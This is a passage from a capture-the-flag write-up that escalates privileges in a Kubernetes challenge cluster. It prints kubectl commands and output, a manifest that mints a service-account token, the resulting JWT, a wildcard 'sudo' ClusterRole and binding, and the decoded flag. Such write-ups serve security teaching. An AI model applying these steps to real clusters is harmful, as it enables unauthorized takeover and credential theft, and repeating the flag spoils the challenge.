                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
pods                                            []                                     []               [get]
events.events.k8s.io                            []                                     []               [list]
```

Ah I see... I needed to supply the qualified name of the service account to
impersonate.

## From Auditor to Daddy

I can read secrets now, but there's no secret `flag` I could find :(

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get secret flag
Error from server (NotFound): secrets "flag" not found
```

I still had, at this point, no clue where the flag is. With this auditor
service account, I was still unable to list secrets. What I was able to list
though, is events:

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get events
Error from server (Forbidden): events is forbidden: User "system:serviceaccount:devsecoops:devsecoops-auditor" cannot list resource "events" in API group "" in the namespace "devsecoops"
```

Wait can I?

Interestingly, there were two API resources called events under different
groups:
```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' api-resources | grep event
events                              ev           v1                                true         Event
events                              ev           events.k8s.io/v1                  true         Event
```

So I just needed to qualify the `event` with the group:
```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get events.events.k8s.io
LAST SEEN   TYPE     REASON              OBJECT                                                MESSAGE
25m         Normal   SuccessfulCreate    replicaset/agile-devsecoops-certified-app-6b67b6588   Created pod: agile-devsecoops-certified-app-6b67b6588-4l6dd
25m         Normal   ScalingReplicaSet   deployment/agile-devsecoops-certified-app             Scaled up replica set agile-devsecoops-certified-app-6b67b6588 to 1
```

There's a name of a pod!

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get pod agile-devsecoops-certified-app-6b67b6588-4l6dd -o yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    scrum.tech/certified-agile-app: "1"
  creationTimestamp: "2025-08-31T00:15:21Z"
  generateName: agile-devsecoops-certified-app-6b67b6588-
  labels:
    app: agile-devsecoops-certified-app
    pod-template-hash: 6b67b6588
  name: agile-devsecoops-certified-app-6b67b6588-4l6dd
  namespace: devsecoops
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: agile-devsecoops-certified-app-6b67b6588
    uid: 443fa2f8-1319-4ccb-90c3-65bfcf4c3373
  resourceVersion: "257"
  uid: 7a5e9235-a058-4aea-b33a-c1188485bb31
spec:
  containers:
  - image: based.agile.tech.nnsc.tf/agile-devsecoops-certified-app:latest
    imagePullPolicy: Always
    name: app
    resources: {}
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-ccf5n
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: scrum-daddy-2604d58b82f3a6cb
  serviceAccountName: scrum-daddy-2604d58b82f3a6cb
  terminationGracePeriodSeconds: 30
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: kube-api-access-ccf5n
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
status:
  phase: Pending
  qosClass: BestEffort
```

I'm lookiog for a name of a secret (hopefully the flag) that I could steal, but
there's no mention of any secrets... What now?

Wait... the pod runs as the service account `scrum-daddy-2604d58b82f3a6cb`.
If I know the name of a service account, I can
[create a secret for it](https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token)
to steal its JWT token, right?

`sa-secret.yaml`:
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: sa-token
  annotations:
    kubernetes.io/service-account.name: scrum-daddy-2604d58b82f3a6cb
type: kubernetes.io/service-account-token
```

```bash
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' apply -f sa-secret.yaml
secret/sa-token created
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get secret sa-token
NAME       TYPE                                  DATA   AGE
sa-token   kubernetes.io/service-account-token   3      11s
$ kubectl --kubeconfig=kubeconfig-intern.yaml --as='system:serviceaccount:devsecoops:devsecoops-auditor' get secret sa-token -o yaml
apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkakNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTlRZMk1ERXhNemN3SGhjTk1qVXdPRE14TURBME5UTTNXaGNOTXpVd09ESTVNREEwTlRNMwpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTlRZMk1ERXhNemN3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTSGpnZk1NNzkyOTlQSHNUMFRjUittTFRyRzQxeXFmR08wVlZIZmx0UDEKaTNJMk1nSGtsNWdRVUM0dUgyWjZuRjR2bUpRVDdQS3k3Sm84N0wxOWdVaDFvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVVFHK3YvM1VBYmI5MFNkZnd3cDJyClRmQUhCbzR3Q2dZSUtvWkl6ajBFQXdJRFJ3QXdSQUlnYnF6bDJHZmJEdXZQVk5aaXJ2WVhlZ0NZNG10ZEJ0ZkUKS1J3NXlKTVduUTBDSUF2a0xTRk44Ykd4WU9XaXN2K0JKQXp3WG43Vm84OG9aRHZya2UxZnFOSmwKLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  namespace: ZGV2c2Vjb29wcw==
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluVkRhamh6Y1ZKNFkzRmxaVFIwUmtRdGIxOUlXVU5VZERkMFZGWmxNMjVxWmxadlpqRlVNV3R0WkZraWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUprWlhaelpXTnZiM0J6SWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXpaV055WlhRdWJtRnRaU0k2SW5OaExYUnZhMlZ1SWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXpaWEoyYVdObExXRmpZMjkxYm5RdWJtRnRaU0k2SW5OamNuVnRMV1JoWkdSNUxUSTJNRFJrTlRoaU9ESm1NMkUyWTJJaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sY25acFkyVXRZV05qYjNWdWRDNTFhV1FpT2lJeU9UZzRaVFExT1MwMFltRTRMVFJrTVRFdE9UZzNOaTAwWTJWaE16Um1aVEF5WWpVaUxDSnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqWTI5MWJuUTZaR1YyYzJWamIyOXdjenB6WTNKMWJTMWtZV1JrZVMweU5qQTBaRFU0WWpneVpqTmhObU5pSW4wLmtFcmpkYU5URHhoTXlrZGdMb2s0ZkJidnlsNVpmaWhZVU9wLVpXUjA0MFJZeHF3Ri1HSTE1Nzc1cGZwV0NNeFczcGMtS21VNGtOUXAtdGQ0U0FqMWQ2eE54c193dWM2UU1aMy1rWHIxTS11NndiQzVmZklTRHBpN2diNHdlLUMzMnVVU2wyZGFDUjB4d2FZMV9IV2RWOEg5M1loZkRmYUFNMFFjcUpqRW5hVWFBLUhzZlJJSS1RQkl1R085SmtSMlZOUnFsN3dsT0hLWlI1UFRIR21DS0UwZW5TYmdFUVEzNUhjRU52OGd2bEdwbkw0N1E1bmZXSnBKUi1lUGZsbUdLNV9MYV9RSVJJSVNCTVF4dnV4VmhOMnBDTGJxa2MxUUZZM01JSlNTNzJLRmRkT21uRWVZV240Y3VuWmQtZmpHeVlkOUZ0MTFvQ0o3OG4wbmFGMXFwQQ==
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{"kubernetes.io/service-account.name":"scrum-daddy-2604d58b82f3a6cb"},"name":"sa-token","namespace":"devsecoops"},"type":"kubernetes.io/service-account-token"}
    kubernetes.io/service-account.name: scrum-daddy-2604d58b82f3a6cb
    kubernetes.io/service-account.uid: 2988e459-4ba8-4d11-9876-4cea34fe02b5
  creationTimestamp: "2025-08-31T01:07:32Z"
  name: sa-token
  namespace: devsecoops
  resourceVersion: "555"
  uid: 3fb4aaf9-8dd0-426d-9378-9af5cf150c15
type: kubernetes.io/service-account-token
```

Ah, the `data.token` field is a double-base64-encoded JWT token. Next layer of
`kubeconfig.yaml` we go!

`kubeconfig-scrum-daddy.yaml`:
```yaml
apiVersion: v1
kind: Config
clusters:
  - name: notes
    cluster:
      server: https://687351f7-44e0-4e51-b534-21c0ace9f5c9.chall.nnsc.tf:443
contexts:
  - name: scrum-daddy@notes
    context:
      cluster: notes
      namespace: devsecoops
      user: scrum-daddy
users:
  - name: scrum-daddy
    user:
      token: eyJhbGciOiJSUzI1NiIsImtpZCI6InVDajhzcVJ4Y3FlZTR0RkQtb19IWUNUdDd0VFZlM25qZlZvZjFUMWttZFkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXZzZWNvb3BzIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6InNhLXRva2VuIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InNjcnVtLWRhZGR5LTI2MDRkNThiODJmM2E2Y2IiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyOTg4ZTQ1OS00YmE4LTRkMTEtOTg3Ni00Y2VhMzRmZTAyYjUiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGV2c2Vjb29wczpzY3J1bS1kYWRkeS0yNjA0ZDU4YjgyZjNhNmNiIn0.kErjdaNTDxhMykdgLok4fBbvyl5ZfihYUOp-ZWR040RYxqwF-GI15775pfpWCMxW3pc-KmU4kNQp-td4SAj1d6xNxs_wuc6QMZ3-kXr1M-u6wbC5ffISDpi7gb4we-C32uUSl2daCR0xwaY1_HWdV8H93YhfDfaAM0QcqJjEnaUaA-HsfRII-QBIuGO9JkR2VNRql7wlOHKZR5PTHGmCKE0enSbgEQQ35HcENv8gvlGpnL47Q5nfWJpJR-ePflmGK5_La_QIRIISBMQxvuxVhN2pCLbqkc1QFY3MIJSS72KFddOmnEeYWn4cunZd-fjGyYd9Ft11oCJ78n0naF1qpA
current-context: scrum-daddy@notes
```

Now what does this have?

```bash
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml auth can-i --list
Resources                                       Non-Resource URLs                      Resource Names   Verbs
clusterroles.rbac.authorization.k8s.io          []                                     []               [create bind escalate]
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
clusterrolebindings.rbac.authorization.k8s.io   []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
```

## From Daddy to Root

Wait a second, daddy can create
[clusterroles](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-v1/) &
[bindings](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/cluster-role-binding-v1/).
I can just make a role with *all* permissions on *all* objects in *all*
namespaces, then bind myself to that role, giving me all those permissions,
right? `escalate` is set here too.

`clusterrole.yaml`:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: sudo
rules:
  - apiGroups:
      - '*'
    resources:
      - '*'
    verbs:
      - '*'
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: sudo
subjects:
  - kind: ServiceAccount
    name: scrum-daddy-2604d58b82f3a6cb
    namespace: devsecoops
roleRef:
  kind: ClusterRole
  name: sudo
  apiGroup: rbac.authorization.k8s.io
```

```bash
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml apply -f clusterrole.yaml
Error from server (Forbidden): error when retrieving current configuration of:
Resource: "rbac.authorization.k8s.io/v1, Resource=clusterroles", GroupVersionKind: "rbac.authorization.k8s.io/v1, Kind=ClusterRole"
Name: "sudo", Namespace: ""
from server for: "clusterrole.yaml": clusterroles.rbac.authorization.k8s.io "sudo" is forbidden: User "system:serviceaccount:devsecoops:scrum-daddy-2604d58b82f3a6cb" cannot get resource "clusterroles" in API group "rbac.authorization.k8s.io" at the cluster scope
Error from server (Forbidden): error when retrieving current configuration of:
Resource: "rbac.authorization.k8s.io/v1, Resource=clusterrolebindings", GroupVersionKind: "rbac.authorization.k8s.io/v1, Kind=ClusterRoleBinding"
Name: "sudo", Namespace: ""
from server for: "clusterrole.yaml": clusterrolebindings.rbac.authorization.k8s.io "sudo" is forbidden: User "system:serviceaccount:devsecoops:scrum-daddy-2604d58b82f3a6cb" cannot get resource "clusterrolebindings" in API group "rbac.authorization.k8s.io" at the cluster scope
```

Hmph... I don't have `get` permissions yet, so I'd need to use `create` here.

```bash
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml create -f clusterrole.yaml -v 6
I0830 21:32:17.952227  226652 loader.go:373] Config loaded from file:  kubeconfig-scrum-daddy.yaml
I0830 21:32:18.114687  226652 round_trippers.go:553] GET https://ab337e2a-f58c-4495-af4c-2bfef2fb4b62.chall.nnsc.tf:443/openapi/v2?timeout=32s 200 OK in 161 milliseconds
I0830 21:32:18.319565  226652 round_trippers.go:553] POST https://ab337e2a-f58c-4495-af4c-2bfef2fb4b62.chall.nnsc.tf:443/apis/rbac.authorization.k8s.io/v1/clusterroles?fieldManager=kubectl-create&fieldValidation=Strict 201 Created in 156 milliseconds
clusterrole.rbac.authorization.k8s.io/sudo created
I0830 21:32:18.480992  226652 round_trippers.go:553] POST https://ab337e2a-f58c-4495-af4c-2bfef2fb4b62.chall.nnsc.tf:443/apis/rbac.authorization.k8s.io/v1/clusterrolebindings?fieldManager=kubectl-create&fieldValidation=Strict 201 Created in 159 milliseconds
clusterrolebinding.rbac.authorization.k8s.io/sudo created
```

And we have root on the cluster!

```bash
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml get pods -A
NAMESPACE     NAME                                             READY   STATUS    RESTARTS   AGE
devsecoops    agile-devsecoops-certified-app-6b67b6588-8dhkj   0/1     Pending   0          22m
kube-system   coredns-796449bc5d-925h9                         0/1     Pending   0          22m
```

And all that is remaining, is to find the flag:
```bash
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml get secrets -A
NAMESPACE     NAME                 TYPE                                  DATA   AGE
daddy-only    daddys-secret-flag   Opaque                                1      22m
devsecoops    sa-token             kubernetes.io/service-account-token   3      9m34s
kube-system   k3s-serving          kubernetes.io/tls                     2      22m
$ kubectl --kubeconfig=kubeconfig-scrum-daddy.yaml get secrets -n daddy-only daddys-secret-flag -o yaml
apiVersion: v1
data:
  flag: Tk5Te1doeV8xbXBsM20zbnRfcjNzdF80cDFfMHJfczBtM3RoMW5nX2wxazNfdGg0dF93aDNuX3kwdV9jNG5fdTVlX2s4c19hMTFjZTk4OWU0YTB9J30=
kind: Secret
metadata:
  creationTimestamp: "2025-08-31T04:10:05Z"
  name: daddys-secret-flag
  namespace: daddy-only
  resourceVersion: "290"
  uid: 9d6c9b9b-727d-45e4-8431-40540bbbe26d
type: Opaque
$ base64 -d
Tk5Te1doeV8xbXBsM20zbnRfcjNzdF80cDFfMHJfczBtM3RoMW5nX2wxazNfdGg0dF93aDNuX3kwdV9jNG5fdTVlX2s4c19hMTFjZTk4OWU0YTB9J30=
NNS{Why_1mpl3m3nt_r3st_4p1_0r_s0m3th1ng_l1k3_th4t_wh3n_y0u_c4n_u5e_k8s_a11ce989e4a0}'}
```
